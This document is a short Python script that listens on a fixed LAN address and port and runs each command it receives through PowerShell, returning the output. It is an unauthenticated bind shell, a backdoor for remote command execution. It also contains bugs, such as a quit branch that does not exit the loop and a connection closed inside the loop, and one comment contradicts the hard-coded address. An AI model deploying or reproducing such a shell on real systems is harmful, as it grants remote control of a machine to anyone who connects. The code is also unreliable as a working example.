import socket
import subprocess
import os

HOST = '192.168.1.201' # Listen on all network interfaces
PORT = 8888    # Choose a port number

s = socket.socket()
s.bind((HOST, PORT))
s.listen(1)
print(f"Listening on {HOST}:{PORT}")

conn, addr = s.accept()
print(f"Connected by {addr}")

while True:
    command = conn.recv(1024).decode().strip()
    if not command:
        print(f"{command} Is not a command!")
        continue

    if command == "q!":
        conn.close()

    # Split command and arguments
    cmd_parts = command.split()
    cmd = cmd_parts[0]
    args = cmd_parts[1:]

    if cmd == 'cd':
        try:
            os.chdir(args[0])
            conn.sendall(b'Successfully changed directory\n')
        except Exception as e:
            conn.sendall(str(e).encode())
        # Execute the PowerShell command and send the output back to the client
    try:
        output = subprocess.check_output(['powershell.exe', '-NoLogo', '-NoProfile', '-NonInteractive', '-Command', command],shell=True, stderr=subprocess.STDOUT, timeout=100)
        conn.sendall(output)
    except subprocess.CalledProcessError as e:
        conn.sendall(e.output)
    except subprocess.TimeoutExpired:
        conn.sendall(b"Command timed out\n")
    except Exception as e:
        conn.sendall(str(e).encode())

    conn.close()